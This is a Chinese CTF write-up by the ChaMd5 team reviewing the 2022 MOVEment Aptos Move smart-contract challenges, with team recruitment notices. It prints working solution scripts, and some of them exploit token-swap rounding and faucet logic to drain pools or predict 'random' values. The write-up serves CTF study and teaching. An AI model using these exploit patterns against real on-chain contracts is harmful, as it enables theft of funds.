# 2022MOVEment Aptos writeup by ChaMd5

> 原文: https://www.ctfiot.com/86671.html
> ID: 86671

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

本文是对比赛的时候没做出来题目的一次复盘。

checkin

题目给了源代码：

module ctfmovement::
checkin {
use std::
signer;
use aptos_framework::
account;
use aptos_framework::
event;

struct FlagHolder has key {
event_set: event::
EventHandle<Flag>,
}

struct Flag has drop, store {
user: address,
flag: bool
}

public entry fun get_flag(account: signer) acquires FlagHolder {
let account_addr = signer::
address_of(&account);
if (!exists<FlagHolder>(account_addr)) {
move_to(&account, FlagHolder {
event_set: account::
new_event_handle<Flag>(&account),
});
};

let flag_holder = borrow_global_mut<FlagHolder>(account_addr);
event::
emit_event(&mut flag_holder.event_set, Flag {
user: account_addr,
flag: true
});
}
}

审计后一目了然，只要调用get_flag函数就可以获得flag。

aptos move run  --function-id 0x3dd3f092f3329fba1818779cc7940b681e37277c43b88f1ac0ebf8b67b7879e3::
checkin::
get_flag  

提交hash后拿到flag

flag{#AKHsfaf-33SFxfGA-H134aB-2022CTFMovement-#}!48e986dd-13f0-49e8-87ef-faa49f3a5c0b

hello move

第二题在拿flag之前需要将挑战初始化并且通过三个小关卡。

在拿到flag之前需要让res的三个属性q1，q2，q3都为true。

一开始我们的账号当然不会有Challenge这个资源，需要首先调用init_challenge函数来获得。

由于init_challenge没有entry属性，因此只能在script或者module里面被调用，所以需要写一个script来调用这个函数。并且只有通过hash，discrete_log，以及add函数才可以满足全部要求。

首先看hash函数：

最后结果是103,111,111,100。

discrete_log函数非常直白，只需要计算一个离散对数就行：

在add函数中，选择为2并且number等于0的时候可以让res.balance < Initialize_balance。

最后写个exp：

script {  
    fun call_init_challenge(account: signer) {  
        ctfmovement::
hello_move::
init_challenge(&account);
        ctfmovement::
hello_move::
hash(&account, vector[103u8, 111u8, 111u8, 100u8]);
        ctfmovement::
hello_move::
discrete_log(&account, 3123592912467026955u128);
        ctfmovement::
hello_move::
add(&account, 2u8, 0u8);
        ctfmovement::
hello_move::
get_flag(&account);
    }
}

交易池coin1
交易池coin2
汇率1-2
汇率2-1
用户coin1
用户coin2
兑换币种
兑换后用户coin1
兑换后用户coin2

50
50
1
1
5
5
coin1
0
10

55
45
0.82
1.22
0
10
coin2
12
0

43
55
1.28
0.78
12
0
coin1
0
14

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
module ctfmovement::
checkin {
use std::
signer;
use aptos_framework::
account;
use aptos_framework::
event;

struct FlagHolder has key {
event_set: event::
EventHandle<Flag>,
}

struct Flag has drop, store {
user: address,
flag: bool
}

public entry fun get_flag(account: signer) acquires FlagHolder {
let account_addr = signer::
address_of(&account);
if (!exists<FlagHolder>(account_addr)) {
move_to(&account, FlagHolder {
event_set: account::
new_event_handle<Flag>(&account),
});
};

let flag_holder = borrow_global_mut<FlagHolder>(account_addr);
event::
emit_event(&mut flag_holder.event_set, Flag {
user: account_addr,
flag: true
});
}
}
aptos move run  --function-id 0x3dd3f092f3329fba1818779cc7940b681e37277c43b88f1ac0ebf8b67b7879e3::
checkin::
get_flag
k = sha3.keccak_256()  
for a in range(256):  
    for b in range(256):  
        for c in range(256):  
            for d in range(256):  
                k.update(bytes([a, b, c, d, 109, 111, 118, 101]))  
                if k.hexdigest() == 'd9ad5396ce1ed307e8fb2a90de7fd01d888c02950ef6852fbc2191d2baf58e79':  
                    print([a, b, c, d])
from sympy.ntheory import discrete_log

result = discrete_log(18446744073709551616, 18164541542389285005, 10549609011087404693)  
print(result)
script {  
    fun call_init_challenge(account: signer) {  
        ctfmovement::
hello_move::
init_challenge(&account);
        ctfmovement::
hello_move::
hash(&account, vector[103u8, 111u8, 111u8, 100u8]);
        ctfmovement::
hello_move::
discrete_log(&account, 3123592912467026955u128);
        ctfmovement::
hello_move::
add(&account, 2u8, 0u8);
        ctfmovement::
hello_move::
get_flag(&account);
    }
}
script {  
    use std::
signer::
address_of;  
    use aptos_framework::
coin;  
  
    fun exp(account: &signer) {  
        let addr = address_of(account);  
        
        coin::
register<ctfmovement::
simple_coin::
SimpleCoin>(account);  

        ctfmovement::
simple_coin::
claim_faucet(account, 100000000000000000);  
        while(true) {  
            let balance = coin::
balance<ctfmovement::
simple_coin::
SimpleCoin>(addr);  
            if (balance > 10000000000) {  
                break;  
            };  

            let (s, u) = ctfmovement::
swap::
pool_reserves<ctfmovement::
simple_coin::
SimpleCoin, ctfmovement::
simple_coin::
TestUSDC>(  
            );  
          
            let usdc_swap = coin::
withdraw<ctfmovement::
simple_coin::
TestUSDC>(account, u);  
            let (out, reward) = ctfmovement::
swap::
swap_exact_y_to_x_direct<ctfmovement::
simple_coin::
SimpleCoin, 
            ctfmovement::
simple_coin::
TestUSDC>(usdc_swap);  
            
            coin::
deposit(address_of(account), out);  
            coin::
deposit(address_of(account), reward);  
        }; 
        
        ctfmovement::
simple_coin::
get_flag(account);  
    }  
}
state = {
    'coin1_balance': 5,
    'coin2_balance': 5,
    'coin1_reserve': 50,
    'coin2_reserve': 50,
}

def get_swap_out(amount, order):
    coin1 = state['coin1_reserve']
    coin2 = state['coin2_reserve']
    if order:
        print(coin2/coin1)
        return (amount*coin2/coin1)

    else:
        print(coin2/coin1)
        return (amount*coin1/coin2)

def swap_coin1_to_coin2(amount):
    state['coin1_balance'] -= amount
    state['coin2_balance'] += get_swap_out(amount, True)
    state['coin1_reserve'] += amount
    state['coin2_reserve'] -= get_swap_out(amount, True)

def swap_coin2_to_coin1(amount):
    state['coin2_balance'] -= amount
    state['coin1_balance'] += get_swap_out(amount, False)
    state['coin2_reserve'] += amount
    state['coin1_reserve'] -= get_swap_out(amount, False)

count = 0
for i in range(100):
  
    print(state)
    swap_coin1_to_coin2(state['coin1_balance'])
    count += 1
   
    print(state)
    swap_coin2_to_coin1(state['coin2_balance'])
    count += 1

print(count)
script {  
    use aptos_framework::
coin;  
    use std::
signer::
address_of;
  
    fun hack(account: &signer, order: bool, amount: u64) {
    //   ctfmovement::
pool::
get_coin(account);
        let addr = address_of(account);

        if(order){
            let coin1 = coin::
withdraw<ctfmovement::
pool::
Coin1>(account, amount);  
            let res = ctfmovement::
pool::
swap_12(&mut coin1, amount);     
            coin::
destroy_zero(coin1);  
            coin::
deposit<ctfmovement::
pool::
Coin2>(addr, res);  
        }
        else{
            let coin2 = coin::
withdraw<ctfmovement::
pool::
Coin2>(account, amount);  
            let res = ctfmovement::
pool::
swap_21(&mut coin2, amount);     
            coin::
destroy_zero(coin2);  
            coin::
deposit<ctfmovement::
pool::
Coin1>(addr, res);  
        }
    }  
}
entry public fun hack(user: &signer) acquires Counter {  
    let result = unlock(user);  
    ctfmovement::
move_lock::
unlock(user, result);  
}
public fun unlock(user : &signer) : u128 acquires Counter {  
    let encrypted_string : vector = encrypt_string(BASE);  
  
    let res_addr : address = account::
create_resource_address(&@ctfmovement, encrypted_string);  
  
    let bys_addr : vector = bcs::
to_bytes(&res_addr);  
  
    let i = 0;  
    let d = 0;  
    let cof : vector = vector::
empty();  
    while ( i < vector::
length(&bys_addr) ) {  
  
        let n1 : u64 = gen_number() % (0xff as u64);  
        let n2 : u8 = (n1 as u8);  
        let tmp : u8 = *vector::
borrow(&bys_addr, i);  
  
        vector::
push_back(&mut cof, n2 ^ (tmp));  
  
        i = i + 5;  
        d = d + 1;  
    };  
  
    let pol : Polynomial = constructor(d, cof);  
  
    let x : u64 = gen_number() % 0xff;  
    let result = evaluate(&mut pol, x);  
    result  
}
script {
    fun exp(account: &signer) {
        ctfmovement_hacker::
hack::
solve(account);
    }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1671497033.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/0-1671497035.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/5-1671497035.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/5-1671497036.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/7-1671497037.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/10-1671497038.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/8-1671497039.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/7-1671497040.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/4-1671497040.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1671497041.png)